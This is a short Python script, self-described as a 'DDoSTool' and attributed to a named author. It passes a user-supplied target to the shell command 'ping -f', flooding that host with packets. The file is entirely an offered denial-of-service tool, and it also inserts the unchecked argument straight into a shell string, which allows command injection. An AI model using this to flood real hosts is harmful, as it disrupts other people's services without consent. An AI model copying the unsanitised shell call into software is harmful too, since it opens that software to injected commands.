# ~ DDoSTool ~
# Any question? HMU on https://mastodon.lol/@7h30WLMan
# Copyright 7h30WLMan 2017

from sys import argv
from os import system

def main():
  system("ping %s -f" %argv[1])

if __name__ == "__main__":
  main()
